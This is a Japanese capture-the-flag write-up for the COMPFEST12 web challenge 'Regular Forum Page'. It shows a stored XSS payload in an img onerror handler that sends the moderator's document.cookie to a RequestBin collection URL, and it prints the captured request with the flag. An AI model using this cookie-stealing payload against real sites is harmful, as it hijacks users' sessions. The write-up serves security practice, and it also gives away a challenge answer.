# Regular Forum Page:Web:864pts
Check out my sweet new forum page! Mods will check often in to prevent bad things from happening.  
128.199.157.172:26552  

# Solution
アクセスすると以下のようなページに飛ぶ。  
SignupするとForumsを作れるようだ。  
Home | Regular Forums  
[site1.png](site/site1.png)  
Create Forum | Regular Forums  
[site2.png](site/site2.png)  
チェックが走るとのことなので、以下のようにXSSしてクッキーを[RequestBin.com](https://requestbin.com/)へ送る。  
```html
<img src=1 onerror="location.href='https://[RequestBinURL]?get='+document.cookie">
```
するとflagが得られた。  
```text
GET/?get=flag=COMPFEST12%7Bhtml_t4g_1s_n0t_C4s3_5ent1t1v3_5bc733a9f8%7D;%20csrftoken=~~~
```

## COMPFEST12{html_t4g_1s_n0t_C4s3_5ent1t1v3_5bc733a9f8}